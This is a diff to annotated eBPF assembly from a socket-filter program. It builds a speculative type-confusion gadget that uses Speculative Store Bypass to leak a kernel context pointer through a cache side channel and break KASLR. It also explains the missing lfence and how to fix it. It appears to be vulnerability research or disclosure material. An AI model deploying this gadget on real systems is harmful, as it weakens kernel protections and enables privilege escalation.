@@ -215,26 +215,30 @@ LBB0_5:
 	.loc	0 62 13 is_stmt 0               # sockfilter.bpf.c:62:13
 .Ltmp71:
 	#
-    # Spec. Type Confusion on Stack using SSB
+    # Pointer-as-Scalar Spec. Type Confusion on Stack using SSB
 	#
 	# Program state: ringbuf_elem_ptr e in r7,
 	# ctx_ptr skb in r6, skb->ifindex in r1, frame pointer in r10,
 	# fp-64 not initialized yet (type STACK_INVALID)
 	#
 	# Create Spec. Type Confusion:
-	r2 = 8
+	r2 = 8   # constant
     r8 = 0   # scalar for type confusion
     r9 = r10 # fp alias for ssb
-    *(u64 *)(r10 - 64) = r6 # ctx_ptr
-	# First store to stack slot, lfence will be added.
-    *(u64 *)(r9 - 64) = r8  # overwrite with scalar, SSB may happen here
-	# NO lfence added here because stack slot was not STACK_INVALID
+    *(u64 *)(r10 - 64) = r6 # fp[-64] = ctx_ptr
+	# lfence added here because of prev. spill of ptr to stack.
+    *(u64 *)(r9 - 64) = r8  # fp[-64] = 0: arch. overwrite ptr with scalar, SSB may happen here
+	# No lfence added here because stack slot was not STACK_INVALID.
+	# To fix this vuln., a lfence should also be added when the slot contained a ptr.
     r8 = *(u64 *)(r10 - 64) # arch. scalar, spec. ctx_ptr
-	r8 -= r2                # detail: keep arch. stack ptr arithmetric in-bounds
+	r8 -= r2                # impl. detail: keep arch. stack ptr arithmetric in-bounds
+	# Could apply bitmask to r8 here to select which bits of ctx_ptr to leak.
     r8 += r10               # spec. ctx_ptr + fp - 8
 	#
 	# Leak ctx_ptr using cache side-channel to break KASLR.
-    *(u64 *)(r8 - 0) = r8 # arch. fp[-8], spec. fp[ctx_ptr - 8]
+	# Use PTR_TO_MAP_VALUE instead of fp as base to easily observe cache change from userspace.
+	# Even with fp as base, we should be able to detect the cache change from within the BPF program and send it to userspace.
+    *(u64 *)(r8 - 0) = r8 # arch. fp[-8] = X, spec. fp[ctx_ptr - 8] = X
     #
 	# Spec. Gadget End
 	#
